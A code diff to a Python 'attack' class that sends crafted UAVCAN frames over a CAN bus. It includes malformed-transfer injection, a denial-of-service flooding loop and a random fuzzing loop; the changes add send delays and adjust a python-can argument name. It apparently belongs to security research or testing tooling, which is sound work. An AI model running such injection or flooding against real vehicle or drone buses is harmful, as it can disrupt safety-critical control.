@@ -6,6 +6,7 @@ import can
 import os
 import random
 import struct
+import time
 
 
 class attack:
@@ -94,7 +95,7 @@ class attack:
             toggle ^= 0b1
             msg = can.Message(
                 arbitration_id=10015501,
-                is_extended_id=True,
+                extended_id=True,
                 data=bytearray.fromhex(
                         ' '.join(payload +
                         [ UAVCAN_PAYLOAD.tail(
@@ -134,11 +135,12 @@ class attack:
             if padding: payload += ["00" for _ in range(7 - len(payload))]
             msg = can.Message(
                 arbitration_id  = random.choice(self.aids_else),
-                is_extended_id  = True,
+                extended_id  = True,
                 data            = bytearray.fromhex( ' '.join(payload + [ UAVCAN_PAYLOAD(transfer_end = 0b0).get_tail() ] ) )
             )
             # print(msg)
             self.bus.send(msg)
+            time.sleep(0.05)
             if counter != -1: counter -= 1
 
     def wrong_END_test(self):
@@ -159,9 +161,10 @@ class attack:
         U_PAYLOAD = UAVCAN_PAYLOAD(transfer_end = 0b0)
 
         aid = random.choice(self.aids_else)
+        print(aid)
         msg = can.Message(
             arbitration_id  = aid,
-            is_extended_id  = True,
+            extended_id  = True,
             data            = bytearray.fromhex( UAVCAN_PAYLOAD.random() + U_PAYLOAD.get_tail() )
         )
         # print(msg)
@@ -172,11 +175,12 @@ class attack:
             U_PAYLOAD.toggle ^= 0b1
             msg = can.Message(
                 arbitration_id  = aid,
-                is_extended_id  = True,
+                extended_id  = True,
                 data            = bytearray.fromhex( UAVCAN_PAYLOAD.random() + U_PAYLOAD.get_tail() )
             )
             # print(msg)
             self.bus.send(msg)
+            time.sleep(0.05)
             if counter != -1: counter -= 1
 
     def DoS(self, counter = -1):
@@ -195,8 +199,8 @@ class attack:
                     extended_id     = True, 
                     data            = b'\xc0'
                 )
-                # print(msg)
                 self.bus.send(msg)
+                time.sleep(0.05)
                 if counter != -1: counter -= 1
 
     def Fuzz(self, counter = -1):
@@ -209,6 +213,7 @@ class attack:
             )
             # print(msg)
             self.bus.send(msg)
+            time.sleep(0.05)
             if counter != -1: counter -= 1
 
 
